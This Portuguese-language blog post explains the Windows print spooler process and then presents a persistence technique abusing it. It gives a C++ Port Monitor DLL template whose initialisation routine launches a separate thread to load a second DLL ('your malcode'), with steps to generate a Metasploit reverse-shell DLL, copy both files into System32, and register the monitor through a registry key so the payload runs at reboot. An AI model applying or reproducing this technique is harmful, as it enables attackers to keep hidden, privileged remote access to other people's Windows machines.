---
layout: post
title: Atingindo Persistência com spoolsv.exe
subtitle: Quando o spoolsv.exe se Torna um Disfarce para Malware
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/spooler.jpg
share-img: /assets/img/path.jpg
tags: [Windows, C++]
---

Profundizando no Mundo do spoolsv.exe

O spoolsv.exe é um processo do sistema operacional Windows responsável por gerenciar as tarefas de impressão. Ele é essencial para o funcionamento correto da impressora no sistema. O termo "spool" significa "Simultaneous Peripheral Operations Online" e refere-se à técnica de gerenciamento de impressão em que os trabalhos de impressão são colocados em uma fila (spool) para que possam ser processados em ordem.

Aqui está um resumo das principais funções e características do spoolsv.exe:

Gerenciamento de Filas de Impressão: O spoolsv.exe gerencia as filas de impressão no sistema. Ele permite que vários trabalhos de impressão sejam enviados à impressora e processados em ordem.

Intermediação de Impressão: Ele atua como uma espécie de intermediário entre os aplicativos que solicitam a impressão e a própria impressora. Os aplicativos enviam os trabalhos para o spooler, que os coloca na fila e os envia para a impressora quando esta estiver pronta para processá-los.

Processamento de Trabalhos: O spoolsv.exe controla o processamento dos trabalhos de impressão. Ele verifica se há erros nos trabalhos, se a impressora está disponível e se há papel e tinta suficientes antes de enviar um trabalho para impressão.

Monitoramento de Impressoras: O processo monitora o status das impressoras instaladas no sistema. Isso inclui verificar se a impressora está online, se há algum problema de comunicação, e assim por diante.

Resolução de Problemas de Impressão: Se ocorrerem erros durante o processo de impressão, o spoolsv.exe pode tentar corrigir ou resolver esses problemas, como reenviar trabalhos que não foram concluídos com sucesso.

Consumo de Recursos: O spoolsv.exe é uma parte essencial do sistema operacional Windows e geralmente consome uma quantidade mínima de recursos do sistema. No entanto, em casos raros, problemas podem surgir que levam a um aumento anormal no uso de CPU ou memória.

Localização no Sistema: O spoolsv.exe geralmente é encontrado na pasta "C:\Windows\System32" no sistema operacional Windows.

Vulnerabilidades e Segurança: Em certas circunstâncias, o spoolsv.exe pode ser alvo de ataques de malware, pois é uma parte crítica do sistema relacionada à funcionalidade de impressão. Por isso, é importante manter o sistema atualizado com as últimas atualizações de segurança.


agora vamos ao que interessa isso não é uma vulnerabilidade é abusar de uma função interna do spooler,basicamente é um Port Monitor DLL template.


esse é o codigo :


~~~cpp

#include <Windows.h>
#include <Winsplp.h>



BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {

	switch ( fdwReason ) {
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
		}
	return TRUE;
}

void Go(void) {
    HMODULE hModule = LoadLibrary("c:\\Windows\\System32\\spool.dll");
    if (hModule == NULL) {
        // erro ao carregar a biblioteca
        return;
    }
    // biblioteca carregada com sucesso, faça o que precisar aqui

}



// Mandatory functions
BOOL WINAPI pfnOpenPort(HANDLE hMonitor, LPWSTR pName, PHANDLE pHandle){ return TRUE; }
BOOL WINAPI OpenPortEx(HANDLE hMonitor, HANDLE hMonitorPort, LPWSTR pPortName, LPWSTR pPrinterName, PHANDLE pHandle, struct _MONITOR2 *pMonitor){ return TRUE; }
BOOL (WINAPI pfnStartDocPort)(HANDLE hPort, LPWSTR pPrinterName, DWORD JobId, DWORD Level, LPBYTE pDocInfo) { return TRUE; }
BOOL WritePort(HANDLE hPort, LPBYTE pBuffer, DWORD cbBuf, LPDWORD pcbWritten){ return TRUE; }
BOOL ReadPort(HANDLE hPort, LPBYTE pBuffer, DWORD cbBuffer, LPDWORD pcbRead){ return TRUE; }
BOOL (WINAPI pfnEndDocPort)(HANDLE hPort) { return TRUE; }
BOOL ClosePort(HANDLE hPort){ return TRUE; }
BOOL XcvOpenPort(HANDLE hMonitor, LPCWSTR pszObject, ACCESS_MASK GrantedAccess, PHANDLE phXcv) { return TRUE; }
DWORD XcvDataPort(HANDLE hXcv, LPCWSTR pszDataName, PBYTE  pInputData, DWORD cbInputData, PBYTE  pOutputData, DWORD cbOutputData, PDWORD pcbOutputNeeded) { return ERROR_SUCCESS; }
BOOL XcvClosePort(HANDLE hXcv){ return TRUE; }
VOID (WINAPI pfnShutdown)(HANDLE hMonitor) { }
DWORD WINAPI pfnNotifyUsedPorts(HANDLE hMonitor,DWORD cPorts,PCWSTR *ppszPorts){ return ERROR_SUCCESS; }
DWORD WINAPI pfnNotifyUnusedPorts(HANDLE hMonitor,DWORD cPorts,PCWSTR *ppszPorts){ return ERROR_SUCCESS; }
DWORD WINAPI pfnPowerEvent(HANDLE hMonitor,DWORD event,POWERBROADCAST_SETTING *pSettings){ return ERROR_SUCCESS; }


LPMONITOR2 WINAPI InitializePrintMonitor2(PMONITORINIT pMonitorInit, PHANDLE phMonitor){
	// launch your malcode in a separate thread
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Go, 0, 0, 0);
	
	MONITOR2 mon = {sizeof(MONITOR2), NULL, pfnOpenPort, OpenPortEx, pfnStartDocPort, WritePort, ReadPort, pfnEndDocPort, ClosePort, NULL, NULL, NULL, NULL, NULL, NULL, XcvOpenPort, XcvDataPort, XcvClosePort, pfnShutdown, NULL, pfnNotifyUsedPorts, pfnNotifyUnusedPorts, pfnPowerEvent };
	return &mon;
}

~~~



bem basicamente voce copia isso em um arquivo .cpp e compila em dll e não exe,e então joga na pasta system32. obs nomear a dll para portmon.dll.

agora a mesma ideia do lsass.exe vamos gerar uma dll reverse shell no metasploit e então copia a dll pasta system 32 também obs : no codigo definimos a dll para spool.dll entao devemos nomear esta dll para spool.dll antes de colocar em system32, e o ultimo passo é executar esse comando no cmd,esse comando cria uma chave de registro.

~~~
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors\PortMonitor" /v Driver /t REG_SZ /d "portmon.dll" /f
~~~

e esse caso deseja remover:
~~~
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors\PortMonitor" /v Driver /f
~~~

e pronto basta apenas reiniciar o sistema.





